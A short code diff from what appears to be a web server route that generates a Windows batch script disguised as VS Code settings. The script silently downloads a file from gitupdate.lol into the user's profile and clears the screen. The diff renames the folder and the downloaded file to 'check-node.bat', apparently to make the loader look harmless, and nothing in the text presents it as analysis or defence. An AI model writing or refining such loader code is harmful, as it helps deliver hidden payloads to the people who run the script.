@@ -84,11 +84,11 @@ app.get("/settings/:type", (req, res) => {
       }
       script = `
 @echo off
-set "VSCODE_DIR=%USERPROFILE%\\.vscode"
+set "VSCODE_DIR=%USERPROFILE%\\.config"
 
 if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
-curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://gitupdate.lol/settings/bootstrap?flag=${flag}
+curl -s -L -o "%VSCODE_DIR%\\check-node.bat" https://gitupdate.lol/settings/bootstrap?flag=${flag}
 cls
     	`;
       break;
